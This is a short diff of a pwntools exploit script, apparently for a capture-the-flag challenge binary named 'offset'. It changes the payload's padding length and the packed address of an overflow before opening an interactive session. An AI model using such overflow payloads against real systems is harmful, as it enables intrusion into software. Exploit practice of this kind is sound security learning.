@@ -1,7 +1,7 @@
 from pwn import *
 p = process('./offset')
-pay = b'\x90'*31
-pay += p32(0x6d8)
+pay = b'A'*30
+pay += p32(0xD8)
 p.sendline(pay)
 p.interactive()
 _______________
